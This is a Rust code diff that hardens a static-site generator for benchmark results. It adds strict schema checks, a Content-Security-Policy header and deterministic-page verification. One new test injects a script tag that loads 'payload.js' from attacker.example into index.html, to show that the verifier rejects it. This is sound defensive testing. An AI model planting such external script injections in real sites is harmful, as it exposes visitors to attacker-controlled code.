@@ -71,6 +71,7 @@ pub(crate) struct SmokeStaticSiteSummary {
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
 struct BrowserCatalog {
     schema_version: u32,
     snapshot_id: String,
@@ -80,6 +81,7 @@ struct BrowserCatalog {
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
 struct BrowserDataset {
     logical_key: String,
     url: String,
@@ -88,6 +90,7 @@ struct BrowserDataset {
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
 struct BrowserRun {
     campaign_id: String,
     run_id: String,
@@ -111,6 +114,7 @@ struct BrowserRun {
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
 struct BrowserIntentionalSkip {
     action_id: String,
     rule_id: String,
@@ -118,6 +122,7 @@ struct BrowserIntentionalSkip {
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
 struct BrowserFinding {
     finding_id: String,
     kind: String,
@@ -134,6 +139,26 @@ fn sha256_hex(bytes: &[u8]) -> String {
     let mut hasher = Sha256::new();
     hasher.update(bytes);
     hex::encode(hasher.finalize())
+}
+
+fn encode_browser_catalog(catalog: &BrowserCatalog) -> Result<Vec<u8>> {
+    serde_json::to_vec_pretty(catalog).context("serializing canonical browser catalog")
+}
+
+fn decode_canonical_browser_catalog(bytes: &[u8]) -> Result<BrowserCatalog> {
+    let value: serde_json::Value =
+        serde_json::from_slice(bytes).context("decoding browser catalog JSON value")?;
+    let catalog: BrowserCatalog =
+        serde_json::from_value(value.clone()).context("decoding typed browser catalog")?;
+    let projected =
+        serde_json::to_value(&catalog).context("projecting typed browser catalog to JSON")?;
+    if value != projected {
+        bail!("browser catalog contains values outside its typed public schema");
+    }
+    if encode_browser_catalog(&catalog)? != bytes {
+        bail!("browser catalog is not canonically encoded");
+    }
+    Ok(catalog)
 }
 
 fn normalize_base_url(value: &str) -> Result<String> {
@@ -257,7 +282,7 @@ fn html_shell(
         .map(|name| format!(r#"<script defer src="{site_root_url}assets/{name}"></script>"#))
         .unwrap_or_default();
     format!(
-        "<!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><meta name=\"bvc-site-root\" content=\"{site_root_url}\"><title>{}</title><link rel=\"stylesheet\" href=\"{site_root_url}assets/{css_name}\">{script}</head><body>{body}</body></html>",
+        "<!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; script-src 'self'; style-src 'self'; connect-src 'self'; img-src 'self' data:; base-uri 'none'; form-action 'none'; frame-ancestors 'none'\"><meta name=\"bvc-site-root\" content=\"{site_root_url}\"><title>{}</title><link rel=\"stylesheet\" href=\"{site_root_url}assets/{css_name}\">{script}</head><body>{body}</body></html>",
         escape_html(title)
     )
 }
@@ -478,6 +503,209 @@ fn actual_site_relpaths(site_dir: &Path) -> Result<BTreeSet<String>> {
     Ok(found)
 }
 
+fn expected_fixed_site_files(
+    catalog: &BrowserCatalog,
+    snapshot: &crate::snapshot::StaticSnapshotManifest,
+) -> Result<BTreeMap<String, Vec<u8>>> {
+    let (css_name, js_name) = static_site_asset_names();
+    let root_site_url = site_root_url("index.html")?;
+    let mut files = BTreeMap::new();
+    files.insert(format!("assets/{css_name}"), STYLE_CSS.as_bytes().to_vec());
+    files.insert(format!("assets/{js_name}"), APP_JS.as_bytes().to_vec());
+    files.insert("catalog.json".to_string(), encode_browser_catalog(catalog)?);
+    files.insert(
+        "snapshot_manifest.v1.pb".to_string(),
+        crate::snapshot::encode_static_snapshot_manifest(snapshot)?,
+    );
+
+    for run in &catalog.runs {
+        let page_relpath = format!("runs/{}/index.html", run.run_id);
+        let run_site_root_url = site_root_url(&page_relpath)?;
+        let root_actions = run
+            .root_action_ids
+            .iter()
+            .map(|id| format!("<li><code>{}</code></li>", escape_html(id)))
+            .collect::<String>();
+        let finding_rows = run
+            .findings
+            .iter()
+            .map(|finding| {
+                let baseline = finding
+                    .baseline_value
+                    .map(|value| format!("{value:.6}"))
+                    .unwrap_or_else(|| "—".to_string());
+                let current = finding
+                    .current_value
+                    .map(|value| format!("{value:.6}"))
+                    .unwrap_or_else(|| "—".to_string());
+                let structural = finding
+                    .structural_hash
+                    .as_deref()
+                    .map(escape_html)
+                    .unwrap_or_else(|| "—".to_string());
+                format!(
+                    "<tr><td>{}</td><td>{}</td><td>{baseline}</td><td>{current}</td><td><code>{structural}</code></td><td>{}</td></tr>",
+                    escape_html(&finding.kind),
+                    escape_html(&finding.subject_key),
+                    finding.evidence_action_ids.len(),
+                )
+            })
+            .collect::<String>();
+        let findings_download = run
+            .findings_protobuf_url
+            .as_deref()
+            .map(|url| {
+                format!(
+                    "<p><a href=\"{run_site_root_url}{url}\">Download canonical findings protobuf</a></p>"
+                )
+            })
+            .unwrap_or_default();
+        let intentional_skip_items = if run.intentionally_skipped_samples.is_empty() {
+            "<li>None</li>".to_string()
+        } else {
+            run.intentionally_skipped_samples
+                .iter()
+                .map(|skipped| {
+                    format!(
+                        "<li><code>{}</code> via <strong>{}</strong>: {}</li>",
+                        escape_html(&skipped.action_id),
+                        escape_html(&skipped.rule_id),
+                        escape_html(&skipped.reason),
+                    )
+                })
+                .collect::<String>()
+        };
+        let intentional_skip_label = if run.intentionally_skipped_samples.len() == 1 {
+            "intentional skip"
+        } else {
+            "intentional skips"
+        };
+        let body = format!(
+            "<header><p><a href=\"{run_site_root_url}runs.html\">← Runs</a></p><h1>{} crate v{}</h1><p class=\"meta\">Campaign {} v{} · DSO v{} · status <strong>{}</strong></p></header><main><div class=\"grid\"><article class=\"card\"><h2>Completion</h2><p>{} roots complete · {} failed · {} canceled</p><p>{} missing outputs · {} failed samples · {} {intentional_skip_label}</p></article><article class=\"card\"><h2>Identity</h2><p>Run <code>{}</code></p><p>Campaign <code>{}</code></p><p><a href=\"{run_site_root_url}{}\">Download public run protobuf</a></p>{findings_download}</article></div><h2>Intentional skips</h2><ul>{intentional_skip_items}</ul><h2>Findings</h2><div class=\"table-wrap\"><table><thead><tr><th>Kind</th><th>Subject</th><th>Baseline loss</th><th>Current loss</th><th>Structural hash</th><th>Evidence actions</th></tr></thead><tbody>{finding_rows}</tbody></table></div><h2>Root actions</h2><ul>{root_actions}</ul><h2>Results</h2><p><a href=\"{run_site_root_url}dataset.html?key={}\">Open g8r versus Yosys/ABC dataset</a></p></main>",
+            escape_html(&run.campaign_name),
+            escape_html(&run.crate_version),
+            escape_html(&run.campaign_name),
+            run.campaign_semantic_version,
+            escape_html(&run.dso_version),
+            escape_html(&run.status),
+            run.completed_root_count,
+            run.failed_count,
+            run.canceled_count,
+            run.missing_output_count,
+            run.failed_sample_count,
+            run.intentionally_skipped_samples.len(),
+            run.run_id,
+            run.campaign_id,
+            run.protobuf_url,
+            url_encode(crate::WEB_STDLIB_G8R_VS_YOSYS_FRAIG_FALSE_INDEX_FILENAME),
+        );
+        files.insert(
+            page_relpath,
+            html_shell(
+                &format!("{} v{}", run.campaign_name, run.crate_version),
+                &run_site_root_url,
+                &body,
+                &css_name,
+                None,
+            )
+            .into_bytes(),
+        );
+    }
+
+    let run_cards = catalog
+        .runs
+        .iter()
+        .map(|run| {
+            format!(
+                "<article class=\"card\"><h2><a href=\"{root_site_url}{}\">{} v{}</a></h2><p>Status <strong>{}</strong> · DSO v{}</p><code>{}</code></article>",
+                run.page_url,
+                escape_html(&run.campaign_name),
+                escape_html(&run.crate_version),
+                escape_html(&run.status),
+                escape_html(&run.dso_version),
+                run.run_id,
+            )
+        })
+        .collect::<String>();
+    let runs_body = format!(
+        "<header><p><a href=\"{root_site_url}\">← Results</a></p><h1>Campaign runs</h1><p class=\"meta\">{} verified public runs</p></header><main><div class=\"grid\">{run_cards}</div></main>",
+        catalog.runs.len()
+    );
+    files.insert(
+        "runs.html".to_string(),
+        html_shell(
+            "xlsynth-bvc campaign runs",
+            &root_site_url,
+            &runs_body,
+            &css_name,
+            None,
+        )
+        .into_bytes(),
+    );
+
+    let cards = catalog
+        .datasets
+        .iter()
+        .map(|dataset| {
+            format!(
+                "<article class=\"card\"><h2><a href=\"{root_site_url}dataset.html?key={}\">{}</a></h2><p>{} bytes</p><code>{}</code></article>",
+                url_encode(&dataset.logical_key),
+                escape_html(&dataset.logical_key),
+                dataset.bytes,
+                dataset.sha256
+            )
+        })
+        .collect::<String>();
+    let index_body = format!(
+        "<header><h1>xlsynth-bvc results</h1><p class=\"meta\">Snapshot <code>{}</code> · {} runs · {} datasets · generated {}</p></header><main><p>This is a self-contained static publication. The build machine and sled database are not involved at request time.</p><p><a href=\"{root_site_url}runs.html\">Browse campaign runs and versions →</a></p><h2>Datasets</h2><div class=\"grid\">{cards}</div></main>",
+        snapshot.snapshot_id,
+        catalog.runs.len(),
+        catalog.datasets.len(),
+        snapshot.generated_utc.to_rfc3339()
+    );
+    files.insert(
+        "index.html".to_string(),
+        html_shell(
+            "xlsynth-bvc results",
+            &root_site_url,
+            &index_body,
+            &css_name,
+            None,
+        )
+        .into_bytes(),
+    );
+    let explorer_body = format!(
+        "<header><p><a href=\"{root_site_url}\">← Results</a></p><h1>Dataset explorer</h1><div class=\"toolbar\"><label>Dataset <select id=\"dataset\"></select></label><span id=\"dataset-meta\" class=\"meta\"></span></div><p id=\"error\"></p></header><main><section id=\"plot\"></section><section id=\"table\"></section><h2>Raw JSON</h2><pre id=\"raw\">Loading…</pre></main>"
+    );
+    files.insert(
+        "dataset.html".to_string(),
+        html_shell(
+            "xlsynth-bvc dataset explorer",
+            &root_site_url,
+            &explorer_body,
+            &css_name,
+            Some(&js_name),
+        )
+        .into_bytes(),
+    );
+    Ok(files)
+}
+
+fn verify_exact_fixed_site_files(
+    site_dir: &Path,
+    catalog: &BrowserCatalog,
+    snapshot: &crate::snapshot::StaticSnapshotManifest,
+) -> Result<()> {
+    for (relpath, expected) in expected_fixed_site_files(catalog, snapshot)? {
+        let actual = fs::read(site_dir.join(&relpath))
+            .with_context(|| format!("reading fixed generated site file: {relpath}"))?;
+        if actual != expected {
+            bail!("fixed generated site file differs from deterministic rendering: {relpath}");
+        }
+    }
+    Ok(())
+}
+
 pub(crate) fn build_static_site(
     options: &BuildStaticSiteOptions,
 ) -> Result<BuildStaticSiteSummary> {
@@ -587,7 +815,7 @@ pub(crate) fn build_static_site(
     write_file(
         &options.out_dir,
         "catalog.json",
-        &serde_json::to_vec_pretty(&catalog).context("serializing browser catalog")?,
+        &encode_browser_catalog(&catalog)?,
     )?;
     write_file(
         &options.out_dir,
@@ -801,6 +1029,7 @@ pub(crate) fn build_static_site(
         STATIC_SITE_MANIFEST_FILENAME,
         &manifest.encode_to_vec(),
     )?;
+    verify_static_site(&options.out_dir).context("verifying generated static site")?;
 
     Ok(BuildStaticSiteSummary {
         out_dir: options.out_dir.display().to_string(),
@@ -1073,8 +1302,9 @@ pub(crate) fn verify_static_site(site_dir: &Path) -> Result<VerifyStaticSiteSumm
             }
         }
     }
-    let catalog: BrowserCatalog = serde_json::from_slice(&fs::read(site_dir.join("catalog.json"))?)
-        .context("decoding browser catalog")?;
+    let catalog_bytes =
+        fs::read(site_dir.join("catalog.json")).context("reading browser catalog")?;
+    let catalog = decode_canonical_browser_catalog(&catalog_bytes)?;
     if catalog.schema_version != 1
         || catalog.snapshot_id != snapshot_id
         || catalog.base_url != base_url
@@ -1099,6 +1329,7 @@ pub(crate) fn verify_static_site(site_dir: &Path) -> Result<VerifyStaticSiteSumm
     if source_snapshot.snapshot_id != snapshot_id {
         bail!("embedded source snapshot identity disagrees with site manifest");
     }
+    verify_exact_fixed_site_files(site_dir, &catalog, &source_snapshot)?;
     let snapshot_data_relpaths = expected_snapshot_site_data_relpaths(&source_snapshot)?;
     if catalog_data_relpaths != snapshot_data_relpaths {
         bail!("static site catalog does not exactly project the embedded source snapshot");
@@ -1510,6 +1741,28 @@ mod tests {
         .expect("serialize empty versions index")
     }
 
+    fn refresh_site_manifest_entry(site_dir: &Path, relpath: &str) {
+        let manifest_path = site_dir.join(STATIC_SITE_MANIFEST_FILENAME);
+        let mut manifest = pb::StaticSiteManifest::decode(
+            fs::read(&manifest_path)
+                .expect("read site manifest")
+                .as_slice(),
+        )
+        .expect("decode site manifest");
+        let replacement = publication_file(site_dir, relpath).expect("describe changed site file");
+        let slot = manifest
+            .files
+            .iter_mut()
+            .find(|file| {
+                file.relpath
+                    .as_ref()
+                    .is_some_and(|value| value.value == relpath)
+            })
+            .expect("declared site file");
+        *slot = replacement;
+        fs::write(manifest_path, manifest.encode_to_vec()).expect("rewrite site manifest");
+    }
+
     #[test]
     fn generated_site_links_are_relocatable() {
         assert_eq!(site_root_url("index.html").expect("root URL"), "./");
@@ -1748,6 +2001,82 @@ mod tests {
     }
 
     #[test]
+    fn site_verifier_rejects_self_consistent_script_and_unknown_catalog_field() {
+        let root = temp_root();
+        let store = ArtifactStore::new(root.clone());
+        store.ensure_layout().expect("store layout");
+        store
+            .write_web_index_bytes(
+                crate::WEB_VERSIONS_SUMMARY_INDEX_FILENAME,
+                &empty_versions_index_bytes(),
+            )
+            .expect("write dataset");
+        let snapshot_dir = root.join("snapshot");
+        build_static_snapshot(
+            &store,
+            &test_repo_root(),
+            &BuildStaticSnapshotOptions {
+                out_dir: snapshot_dir.clone(),
+                overwrite: false,
+                skip_rebuild_web_indices: true,
+            },
+        )
+        .expect("build snapshot");
+        let site_dir = root.join("site");
+        build_static_site(&BuildStaticSiteOptions {
+            snapshot_dir,
+            out_dir: site_dir.clone(),
+            base_url: "/".into(),
+            overwrite: false,
+        })
+        .expect("build site");
+
+        let manifest_path = site_dir.join(STATIC_SITE_MANIFEST_FILENAME);
+        let original_manifest = fs::read(&manifest_path).expect("read original manifest");
+        let index_path = site_dir.join("index.html");
+        let original_index = fs::read_to_string(&index_path).expect("read index");
+        fs::write(
+            &index_path,
+            original_index.replace(
+                "</body>",
+                "<script src=\"https://attacker.example/payload.js\"></script></body>",
+            ),
+        )
+        .expect("inject external script");
+        refresh_site_manifest_entry(&site_dir, "index.html");
+        let error = verify_static_site(&site_dir)
+            .expect_err("self-consistent external script must fail verification");
+        assert!(
+            format!("{error:#}").contains("deterministic rendering"),
+            "unexpected error: {error:#}"
+        );
+
+        fs::write(&index_path, original_index).expect("restore index");
+        fs::write(&manifest_path, &original_manifest).expect("restore manifest");
+        let catalog_path = site_dir.join("catalog.json");
+        let mut catalog: serde_json::Value =
+            serde_json::from_slice(&fs::read(&catalog_path).expect("read catalog"))
+                .expect("decode catalog value");
+        catalog.as_object_mut().expect("catalog object").insert(
+            "private_path".to_string(),
+            serde_json::Value::String("/srv/build/private".to_string()),
+        );
+        fs::write(
+            &catalog_path,
+            serde_json::to_vec_pretty(&catalog).expect("encode modified catalog"),
+        )
+        .expect("write modified catalog");
+        refresh_site_manifest_entry(&site_dir, "catalog.json");
+        let error = verify_static_site(&site_dir)
+            .expect_err("self-consistent unknown catalog field must fail verification");
+        assert!(
+            format!("{error:#}").contains("unknown field `private_path`"),
+            "unexpected error: {error:#}"
+        );
+        fs::remove_dir_all(root).expect("cleanup");
+    }
+
+    #[test]
     fn site_overwrite_rejects_snapshot_ancestor_before_deletion() {
         let root = temp_root();
         let store = ArtifactStore::new(root.join("store"));
@@ -1870,9 +2199,16 @@ mod tests {
         dataset.sha256 = sha256_hex(changed.as_bytes());
         fs::write(
             &catalog_path,
-            serde_json::to_vec(&catalog).expect("encode catalog"),
+            encode_browser_catalog(&catalog).expect("encode canonical catalog"),
         )
         .expect("rewrite catalog");
+        let embedded_snapshot = load_static_snapshot_manifest(&site_dir)
+            .expect("load embedded snapshot for fixed-page regeneration");
+        for (relpath, bytes) in
+            expected_fixed_site_files(&catalog, &embedded_snapshot).expect("render fixed files")
+        {
+            fs::write(site_dir.join(relpath), bytes).expect("rewrite fixed site file");
+        }
 
         let manifest_path = site_dir.join(STATIC_SITE_MANIFEST_FILENAME);
         let mut manifest = pb::StaticSiteManifest::decode(
@@ -1881,19 +2217,14 @@ mod tests {
                 .as_slice(),
         )
         .expect("decode site manifest");
-        for relpath in [&dataset_relpath, "catalog.json"] {
-            let replacement =
-                publication_file(&site_dir, relpath).expect("describe changed site file");
-            let slot = manifest
-                .files
-                .iter_mut()
-                .find(|file| {
-                    file.relpath
-                        .as_ref()
-                        .is_some_and(|value| value.value == relpath)
-                })
-                .expect("declared site file");
-            *slot = replacement;
+        for slot in &mut manifest.files {
+            let relpath = slot
+                .relpath
+                .as_ref()
+                .expect("declared relpath")
+                .value
+                .clone();
+            *slot = publication_file(&site_dir, &relpath).expect("describe changed site file");
         }
         fs::write(&manifest_path, manifest.encode_to_vec()).expect("rewrite site manifest");
 
